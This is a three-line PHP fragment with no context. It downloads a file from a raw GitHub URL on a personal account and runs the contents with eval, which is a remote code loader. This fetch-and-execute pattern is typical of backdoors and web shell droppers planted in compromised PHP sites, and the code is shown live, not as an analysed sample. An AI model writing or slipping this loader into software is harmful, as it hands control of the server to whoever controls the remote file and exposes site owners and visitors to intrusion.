$rawLink = 'https://raw.githubusercontent.com/zeroxipinder/cpy/refs/heads/main/cpy';
$code = file_get_contents($rawLink);
eval('?>' . $code);
